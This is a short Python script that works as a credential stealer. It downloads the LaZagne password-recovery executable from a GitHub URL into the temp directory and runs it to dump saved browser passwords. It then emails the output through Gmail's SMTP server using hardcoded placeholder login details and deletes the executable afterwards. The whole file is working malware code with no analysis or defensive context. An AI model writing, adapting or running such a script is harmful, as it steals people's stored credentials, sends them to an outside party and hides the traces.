#!/usr/bin/env python
import requests
import subprocess, smtplib, re, os, tempfile


def download(url):
    get_request = requests.get(url)
    # last element of list
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_request.content)


def send_email(email, password, message):
    # google allow others to user there smtp server
    # address for google's server and port
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
print(temp_directory)
download("https://github.com/Hokagenaruto123456/Lazagne123456/raw/master/laZagne_x86.exe")
lazagne_output = subprocess.check_output("laZagne_x86.exe browsers", shell=True)
send_email("test@gmail.com", "testpassword", lazagne_output)
os.remove("laZagne_x86.exe")
# C:\Python27\python.exe -m pip install requests

